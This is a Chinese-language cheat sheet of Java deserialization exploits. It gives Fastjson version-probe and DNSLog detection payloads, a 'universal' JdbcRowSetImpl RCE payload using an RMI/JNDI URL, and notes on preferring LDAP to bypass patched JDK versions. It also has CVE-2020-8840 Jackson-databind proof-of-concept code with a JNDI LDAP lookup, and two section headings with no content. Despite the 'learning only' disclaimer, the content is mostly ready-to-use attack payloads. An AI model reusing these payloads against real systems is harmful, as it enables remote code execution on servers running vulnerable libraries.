

# JAVA组件漏洞


- [Fastjson](#Fastjson)

- [Apache-Poi](#Apache-poi)

- [Shiro](#Shiro)

- [Jackson-databind](#Jackson-databind)
  

## Fastjson

### 查看版本

[From 浅蓝：](https://b1ue.cn/archives/402.html)    ```1.{"@type":"java.lang.AutoCloseable"```


### 版本 <= 1.2.48

### 回显 

```
======= 回显 =======
{"@type":"java.net.Inet4Address", "val":"dnslog"}
{"@type":"java.net.Inet6Address", "val":"dnslog"}
{"@type":"java.net.InetSocketAddress"{"address":, "val":"dnslog"}}
{"@type":"com.alibaba.fastjson.JSONObject", {"@type": "java.net.URL", "val":"dnslog"}}""}
{{"@type":"java.net.URL", "val":"dnslog"}:"aaa"}
Set[{"@type":"java.net.URL", "val":"dnslog"}]
Set[{"@type":"java.net.URL", "val":"dnslog"}
{{"@type":"java.net.URL", "val":"dnslog"}:0
```

### RCE

```
======= 通杀payload =======
{
    "rand1": {
      "@type": "java.lang.Class",
      "val": "com.sun.rowset.JdbcRowSetImpl"
    },
    "rand2": {
      "@type": "com.sun.rowset.JdbcRowSetImpl",
      "dataSourceName": "rmi://127.0.0.1:1099/aaa",
      "autoCommit": true
    }
}
```

### 利用要点

(备注：根据实战中经验，更推荐使用Ldap协议进行漏洞利用）

RMI协议的利用方式 在JDK 6u132/7u122/8u113 及以上版本中修复了

LDAP协议的利用方式 在JDK 6u211/7u201/8u191 及以上版本中修复了

LDAP的利用方式要优于RMI, 且LDAP可以直接返回序列化对象, 绕过更高版本的JDK限制

当发现一台Redis的数据中含有@type的字样时，意味着AutoType多半是开的



## Apache-poi

## Shiro

## Jackson-databind

#### CVE=2020-8840

影响范围：2.0.0 <= FasterXML jackson-databind <= 2.9.10.2

不受影响版本：2.8.11.5 、 2.9.10.3

```
bjectMapper mapper = new ObjectMapper();
mapper.enableDefaultTyping();
String json = "[\"org.apache.xbean.propertyeditor.JndiConverter\", {\"asText\":\"ldap://localhost:1389/ExportObject\"}]";
try {
    mapper.readValue(json, Object.class);
} catch (IOException e) {
    e.printStackTrace();
}
```



## 声明

**以上仅用作学习用途**
